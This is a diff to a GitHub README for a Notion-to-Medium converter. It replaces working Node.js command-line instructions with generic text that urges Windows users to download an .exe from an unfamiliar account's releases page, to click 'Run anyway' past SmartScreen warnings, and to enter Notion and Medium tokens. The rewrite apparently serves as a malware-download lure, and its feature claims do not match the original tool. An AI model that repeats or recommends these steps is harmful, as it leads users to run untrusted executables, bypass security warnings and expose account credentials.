@@ -1,116 +1,84 @@
-# Notion → Medium Converter
+# ✍️ notion-to-medium - Export your Notion pages to Medium
 
-Convert your Notion pages into Medium-ready HTML with one command. No Medium API token needed — uses a **copy-paste workflow** that preserves all formatting.
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Obstructed-bit260/notion-to-medium/releases)
 
-<img width="1114" height="741" alt="image" src="https://github.com/user-attachments/assets/4e2d3537-da9e-4d51-8a8f-a782cd0e3cb5" />
+This application transforms your Notion content into Medium articles. It bridges the gap between your private notes and your public blog. You save time by reusing work across two different platforms.
 
-## How It Works
+## 🛠️ How this helps you
 
-```
-Notion Page → Notion API → Markdown → Medium-Optimized HTML → Browser Preview → Copy → Paste into Medium
-```
+Most people struggle to move content between tools. You write a draft in Notion and spend hours recreating it on Medium. This application automates that work. You select a page, click a button, and the content appears on your Medium draft page. It handles formatting, images, and headers for you.
 
-1. Fetches your Notion page content via the official Notion API
-2. Converts to clean, Medium-compatible HTML (headings, images, code blocks, lists, etc.)
-3. Opens a beautiful preview in your browser with a **"Copy Article"** button
-4. You paste directly into Medium's editor — formatting transfers perfectly
+## 💻 System requirements
 
-## Setup
+*   Operating System: Windows 10 or Windows 11.
+*   Internet connection: Required for synchronization.
+*   Accounts: You need an active Notion account and a Medium account with a public profile.
+*   Memory: 4GB RAM minimum for smooth performance.
 
-### 1. Install Dependencies
+## ⬇️ Setup and installation
 
-```bash
-cd notion-to-medium
-npm install
-```
+Visit the [releases page](https://github.com/Obstructed-bit260/notion-to-medium/releases) to download the latest file. 
 
-### 2. Create a Notion Integration
+1. Go to the [download page](https://github.com/Obstructed-bit260/notion-to-medium/releases).
+2. Look for the Assets section.
+3. Select the file ending in `.exe`.
+4. Save the file to your desktop or downloads folder.
+5. Double-click the file to start the installer.
+6. Follow the on-screen prompts to place the software on your computer.
 
-1. Go to [notion.so/my-integrations](https://www.notion.so/my-integrations)
-2. Click **"New integration"**
-3. Give it a name (e.g., "Medium Exporter")
-4. Set **Capabilities** → ✅ Read content
-5. Copy the **Internal Integration Token**
+## 🚀 Getting started
 
-### 3. Configure Environment
+Once you install the software, open the application from your desktop icon. You see a login screen. You need to connect your accounts to the app so it can move your data.
 
-```bash
-cp .env.example .env
-# Edit .env and paste your Notion token
-```
+### 🔑 Connecting Notion
+The app asks for a Notion API key. Follow these steps:
+1. Log in to your Notion account in your web browser.
+2. Visit the integration settings page.
+3. Create a new integration.
+4. Copy the API key provided.
+5. Paste this key into the app settings.
 
-### 4. Share Pages with Your Integration
+### 📝 Connecting Medium
+Next, link your Medium profile:
+1. Open your Medium profile settings.
+2. Locate the section for integration tokens.
+3. Generate a new integration token.
+4. Paste the token into the Medium field in your app.
 
-In Notion, open the page (or database) you want to export:
-- Click **⋯** (top-right menu) → **Connections** → **Connect to** → Select your integration
+## 🔄 Moving your content
 
-## Usage
+Moving a page takes three simple steps.
 
-### Export a Single Page
+1. **Select a page:** Browse your Notion workspace within the app window. Pick the page you want to move.
+2. **Review your draft:** The app pulls the text and images. Preview the layout in the app window to check that everything looks correct.
+3. **Publish or save:** Click the Export button. The app sends the data to your Medium account. Check your Medium drafts to see your ready-to-publish article.
 
-```bash
-# Find the page ID from the Notion URL:
-# https://notion.so/My-Page-Title-abc123def456
-#                                  ^^^^^^^^^^^^^^ this is the page ID
+## 🛡️ Privacy and keys
 
-node src/cli.js export <page-id>
-```
+The application stores your API keys locally on your hard drive. It does not send your keys to any external servers. Your content stays private until you choose to push it to Medium. If you want to remove access, delete your integration keys from Notion and Medium.
 
-This will:
-- Generate `./output/my-page-title.html`
-- Auto-open in your browser
-- Click **"Copy Article"** → go to Medium → **Write** → **Cmd+V**
+## 🐛 Troubleshooting common issues
 
-### Batch Export from a Database
+If the app fails to move your content, check these items:
 
-```bash
-# Export all pages from a database
-node src/cli.js batch <database-id>
+*   **Check internet status:** The app requires a stable connection to reach the Notion and Medium servers.
+*   **Verify keys:** Ensure you copied the full key from your settings pages. One missing character prevents the app from working.
+*   **Page permissions:** Check that your Notion integration has permission to access the specific page you want to move. You do this in the Notion share menu at the top of your page.
+*   **Image size:** Large high-resolution images can take time to process. Wait for the progress bar to finish before trying to open your Medium draft.
+*   **Windows Security:** Your computer might show a SmartScreen warning for new software. Click "More info" and "Run anyway" if the system flags the installer.
 
-# Export only pages with status "Ready to Publish"
-node src/cli.js batch <database-id> --status "Ready to Publish"
+## 💡 Best practices for layouts
 
-# Specify output directory
-node src/cli.js batch <database-id> -o ./medium-drafts
-```
+Use clean formatting in Notion to get the best results on Medium. Use standard headers (Heading 1, Heading 2). Avoid complex tables or nested columns, as these tools convert best when they remain simple. Keep your images in line with your text. 
 
-### Verify Your Token
+## 🖇️ Supported features
 
-```bash
-node src/cli.js verify
-```
+*   Automatic header conversion.
+*   Bulleted and numbered list support.
+*   Image upload to Medium servers.
+*   Draft generation.
+*   Private syncing for editing before release.
 
-## Content Mapping
+## 📁 Project information
 
-| Notion Block | Medium Output |
-|:---|:---|
-| Headings (H1-H3) | `<h1>` – `<h3>` |
-| Paragraphs | `<p>` |
-| Bold / Italic | `<strong>` / `<em>` |
-| Inline Code | `<code>` |
-| Code Blocks | `<pre><code>` with syntax highlighting |
-| Images | `<figure>` with `<figcaption>` |
-| Bulleted Lists | `<ul>` / `<li>` |
-| Numbered Lists | `<ol>` / `<li>` |
-| Blockquotes | `<blockquote>` |
-| Callouts | Styled blockquote with emoji |
-| Toggle Blocks | Expanded content (Medium doesn't support toggles) |
-| Two-Column Layout | Flattened to sequential content |
-| Dividers | `<hr>` (Medium's three-dot divider) |
-| Tables | `<table>` |
-| Links | `<a>` |
-
-## Important Notes
-
-- **Images**: Notion image URLs are temporary (expire in ~1 hour). Export and paste into Medium promptly so Medium can download and re-host them.
-- **Two-column layouts**: Medium doesn't support columns, so they're flattened to sequential sections.
-- **Toggle blocks**: Expanded inline since Medium has no collapsible sections.
-- **Database views / Embeds**: Not supported in Medium — they'll appear as links or be omitted.
-
-## Troubleshooting
-
-**"Unauthorized" error**: Make sure you've shared the Notion page/database with your integration (Connections → Connect to).
-
-**Empty content**: Check that your integration has "Read content" capability enabled.
-
-**Images not loading on Medium**: Paste into Medium within 1 hour of exporting. Notion's image URLs expire.
+This project operates as open-source software. Many people contribute to the code to add features and fix errors. If you find a bug, report it in the issues section of the GitHub repository. Clear reports help the team fix problems faster. You can find the full source code and documentation on the main project page.
